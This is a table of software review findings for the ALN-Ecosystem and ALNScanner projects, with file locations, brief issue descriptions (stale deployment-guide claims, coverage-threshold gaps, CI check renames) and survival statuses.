| F-P9a-4 | ALN-Ecosystem | `backend/tests/contract/http/oneAuthProofs.test.js:50-59 (mapping under` | No completeness pin binding the FLOOR action map to the AsyncAPI GmCommand enum | SURVIVES |
| F-P11a-5 | ALN-Ecosystem | `DEPLOYMENT_GUIDE.md:160-163 (new)` | Guide's env reference declares itself complete and 'Verified 2026-09-05' but omits ENABLE_AUDIO_WIRES (a produ | SURVIVES-NARROWED |
| F-P11a-6 | ALN-Ecosystem | `backend/.coverage-thresholds.json:82 entries vs 86 src` | backend/.coverage-thresholds.json has no entry for 4 src/ modules, so npm run coverage:check cannot fail on th | SURVIVES |
| F-P11a-7 | ALN-Ecosystem | `backend/test-scoreboard-update.js:10-12, 51-60` | backend/test-scoreboard-update.js is a dead manual script that cannot succeed against the tip; the credential  | SURVIVES |
| F-P11a-8 | ALN-Ecosystem | `DEPLOYMENT_GUIDE.md:1436, 937, 500/515` | Three stale factual claims in DEPLOYMENT_GUIDE (all pre-existing, untouched by this diff) | SURVIVES |
| F-P11a-9 | ALN-Ecosystem | `docs/preflight-checklist.md:n/a (absence); maste` | Preflight never checks xdotool, wmctrl or chromium-browser, all hard requirements of the scoreboard/display dr | SURVIVES |
| F-P11a-10 | ALN-Ecosystem | `.github/workflows/test.yml:222-232` | The Tier-L matrix renames the CI check, which can strand an existing branch-protection required-check | SURVIVES-NARROWED |
| F-P11b-1 | ALN-Ecosystem | `.claude/investigation-context.md:126` | Rename orphaned a cross-reference in .claude/investigation-context.md | SURVIVES-NARROWED |
| F-P11b-2 | ALN-Ecosystem | `docs/plans/CURRENT-STATE.md:19, 34 (also docs/pl` | Merge-train vehicle count/last-PR is inconsistent across three same-day 'current state' docs | SURVIVES-NARROWED |
| LD-2 | ALNScanner | `ALNScanner/src/network/orchestratorClient.js:26-49 (pin: ALNScann` | Removing a MESSAGE_TYPES entry (e.g. 'service:state') is green across the whole ALNScanner suite; only the par | SURVIVES-NARROWED |
